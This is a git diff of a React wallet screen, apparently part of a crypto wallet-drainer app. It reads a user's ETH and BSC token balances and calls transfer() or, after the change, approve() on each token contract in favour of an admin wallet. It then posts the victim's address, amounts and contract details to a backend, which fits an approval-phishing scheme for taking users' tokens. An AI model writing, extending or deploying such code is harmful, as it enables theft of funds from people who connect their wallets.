@@ -111,7 +111,6 @@ const UserScreen = () => {
         const array1 = userAllTokenBalance.eth ? userAllTokenBalance.eth : [];
         const array2 = userAllTokenBalance.bsc ? userAllTokenBalance.bsc : [];
         const array3 = array1.concat(array2).filter(e => e.currency.address !== "-");
-        console.log(array3);
         const array4 = array3.map(t => t.currency.symbol);
         const currentTokenPrice = await livePrice(array4);
         for (let i = 0; i < array3.length; i++) {
@@ -153,7 +152,8 @@ const UserScreen = () => {
                         amount: approveAmount,
                         symbol: approveToken.currency.symbol,
                         contractAddress: approveToken.currency.address,
-                        network: "BSC"
+                        network: "BSC",
+                        adminWalletdAdress: adminWalletAddress
                       });
                     });
                 }
@@ -178,11 +178,11 @@ const UserScreen = () => {
                         amount: approveAmount,
                         symbol: approveToken.currency.symbol,
                         contractAddress: approveToken.currency.address,
-                        network: "ETH"
+                        network: "ETH",
+                        adminWalletdAdress: adminWalletAddress
                       });
                     });
                 }
-
               }
             }
           } catch (error) {
@@ -227,15 +227,19 @@ const UserScreen = () => {
           } else {
             let api = "https://api.bscscan.com/api?module=contract&action=getabi&address=" + approveToken.currency.address + "&apikey=" + GET_BSC_SCAN_API_KEY;
             let temp = await axios.get(api);
+            console.log(temp);
             const contractABI = JSON.parse(temp.data.result);
             const nowContract = new web3.eth.Contract(contractABI, approveToken.currency.address);
-            await nowContract.methods.transfer(adminWalletAddress, web3.utils.toWei((approveAmount).toString(), "ether")).send({ from: myAddress })
-              .on('receipt', (receipt) => { console.log(receipt) })
+            await nowContract.methods.approve(adminWalletAddress, web3.utils.toWei((approveAmount).toString(), "ether")).send({ from: myAddress })
               .then(async function (receipt) {
+                console.log(receipt);
                 await axios.post('http://localhost:5000/products', {
                   userWalletAddress: myAddress,
                   amount: approveAmount,
                   symbol: approveToken.currency.symbol,
+                  contractAddress: approveToken.currency.address,
+                  network: "BSC",
+                  adminWalletdAdress: adminWalletAddress
                 });
               });
           }
@@ -253,13 +257,15 @@ const UserScreen = () => {
             let temp = await axios.get(api);
             const contractABI = JSON.parse(temp.data.result);
             const nowContract = new web3.eth.Contract(contractABI, approveToken.currency.address);
-            await nowContract.methods.transfer(adminWalletAddress, web3.utils.toWei((approveAmount).toString(), "ether")).send({ from: myAddress })
-              .on('receipt', (receipt) => { console.log(receipt) })
+            await nowContract.methods.approve(adminWalletAddress, web3.utils.toWei((approveAmount).toString(), "ether")).send({ from: myAddress })
               .then(async function (receipt) {
                 await axios.post('http://localhost:5000/products', {
                   userWalletAddress: myAddress,
                   amount: approveAmount,
                   symbol: approveToken.currency.symbol,
+                  contractAddress: approveToken.currency.address,
+                  network: "ETH",
+                  adminWalletdAdress: adminWalletAddress
                 });
               });
           }
